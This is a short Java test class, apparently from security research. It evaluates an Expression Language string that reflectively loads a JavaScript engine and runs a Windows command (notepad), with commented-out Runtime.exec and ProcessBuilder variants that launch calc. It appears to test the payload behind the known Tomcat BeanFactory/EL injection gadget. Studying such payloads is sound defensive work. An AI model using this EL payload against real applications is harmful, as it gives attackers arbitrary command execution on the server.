package Demo;

import org.apache.naming.factory.BeanFactory;

import javax.el.ELProcessor;
import java.io.IOException;

public class Test {
    public static void main(String[] args) {

        ELProcessor a = new ELProcessor();
//        try {
//            Runtime.getRuntime().exec(new String[]{"cmd","/c","calc"});
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
        // new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','calc']).start()
        a.eval("\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('cmd /c notepad')\")");
    }
}
